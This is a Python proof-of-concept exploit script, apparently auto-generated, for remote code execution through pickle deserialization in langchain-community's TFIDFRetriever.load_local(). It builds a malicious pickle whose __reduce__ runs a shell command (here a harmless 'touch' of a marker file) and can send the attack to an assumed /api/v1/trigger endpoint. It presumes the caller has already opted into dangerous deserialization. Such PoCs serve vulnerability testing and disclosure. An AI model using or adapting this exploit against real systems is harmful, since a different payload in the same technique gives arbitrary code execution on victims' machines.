#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-018
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_34.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langchain-community-only RCE
Vulnerability: Deserialization of untrusted pickle/joblib files via load_local()
Target: TFIDFRetriever.load_local() with allow_dangerous_deserialization=True

This PoC demonstrates how an attacker can achieve RCE by providing a malicious
pickle file that gets loaded by the vulnerable function. The exploit assumes
the attacker can control folder_path and file_name parameters, and that the
calling code sets allow_dangerous_deserialization=True based on user input.

Usage:
    python3 poc_exploit.py --target http://victim:8000 --folder /tmp/attacker --file malicious
"""

import argparse
import os
import pickle
import subprocess
import sys
import tempfile
import requests
from pathlib import Path

# =============================================================================
# Step 1: Create a malicious pickle file that executes a benign command
# =============================================================================

class MaliciousPayload:
    """
    A class whose __reduce__ method returns a callable and arguments
    that will be executed during unpickling. We use a benign command
    to demonstrate RCE without causing harm.
    """
    def __reduce__(self):
        # Benign command: create a marker file to prove code execution
        cmd = ("touch", "/tmp/poc_success.txt")
        return (subprocess.check_call, (cmd,))

def create_malicious_pickle(filepath: str) -> None:
    """
    Creates a pickle file at the given path that will execute
    'touch /tmp/poc_success.txt' when deserialized.
    """
    payload = MaliciousPayload()
    with open(filepath, "wb") as f:
        pickle.dump(payload, f)
    print(f"[+] Created malicious pickle file: {filepath}")

# =============================================================================
# Step 2: Simulate the vulnerable function call (local test)
# =============================================================================

def simulate_vulnerable_call(folder_path: str, file_name: str) -> None:
    """
    Directly calls the vulnerable load_local function with attacker-controlled
    parameters and allow_dangerous_deserialization=True.
    This simulates what a vulnerable web endpoint would do.
    """
    # Import the vulnerable function from the local package
    sys.path.insert(0, "/tmp/langchain-community-only")
    from langchain_community.retrievers.tfidf import TFIDFRetriever

    print(f"[*] Calling TFIDFRetriever.load_local() with:")
    print(f"    folder_path = {folder_path}")
    print(f"    file_name   = {file_name}")
    print(f"    allow_dangerous_deserialization = True")

    try:
        # This will trigger deserialization of our malicious pickle
        retriever = TFIDFRetriever.load_local(
            folder_path=folder_path,
            file_name=file_name,
            allow_dangerous_deserialization=True
        )
        print(f"[!] Unexpected: load_local returned without error: {retriever}")
    except Exception as e:
        # The exploit may raise an exception after executing the payload
        print(f"[*] Exception caught (expected after payload execution): {e}")

# =============================================================================
# Step 3: Remote exploitation via HTTP (simulated web endpoint)
# =============================================================================

def remote_exploit(target_url: str, folder_path: str, file_name: str) -> None:
    """
    Sends a crafted request to a vulnerable web endpoint that calls
    load_local with attacker-controlled parameters.
    Assumes the endpoint is at /api/v1/trigger and accepts JSON with
    folder_path, file_name, and allow_dangerous_deserialization fields.
    """
    payload = {
        "folder_path": folder_path,
        "file_name": file_name,
        "allow_dangerous_deserialization": True
    }
    print(f"[*] Sending exploit to {target_url}/api/v1/trigger")
    print(f"    Payload: {payload}")

    try:
        resp = requests.post(
            f"{target_url}/api/v1/trigger",
            json=payload,
            timeout=10
        )
        print(f"[*] Response status: {resp.status_code}")
        print(f"[*] Response body: {resp.text[:500]}")
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed - is the target running?")
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")

# =============================================================================
# Main execution
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community RCE via pickle deserialization"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target URL (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--folder",
        default="/tmp/attacker",
        help="Folder path to use (default: /tmp/attacker)"
    )
    parser.add_argument(
        "--file",
        default="malicious",
        help="File name to use (default: malicious)"
    )
    parser.add_argument(
        "--remote",
        action="store_true",
        help="Attempt remote exploitation instead of local simulation"
    )
    args = parser.parse_args()

    # Create the malicious pickle file in the specified folder
    folder = Path(args.folder)
    folder.mkdir(parents=True, exist_ok=True)
    pickle_path = folder / f"{args.file}.pkl"
    create_malicious_pickle(str(pickle_path))

    # Also create a dummy .joblib file (required by load_local but not executed)
    joblib_path = folder / f"{args.file}.joblib"
    with open(joblib_path, "wb") as f:
        f.write(b"dummy joblib content")
    print(f"[+] Created dummy joblib file: {joblib_path}")

    if args.remote:
        # Attempt remote exploitation
        remote_exploit(args.target, args.folder, args.file)
    else:
        # Local simulation
        simulate_vulnerable_call(args.folder, args.file)

    # Check if the payload executed
    marker = Path("/tmp/poc_success.txt")
    if marker.exists():
        print("\n[+] SUCCESS: Marker file /tmp/poc_success.txt was created!")
        print("    This proves arbitrary code execution was achieved.")
        # Clean up the marker
        marker.unlink()
    else:
        print("\n[-] Marker file not found - payload may not have executed.")
        print("    Check that the target is vulnerable and parameters are correct.")

if __name__ == "__main__":
    main()
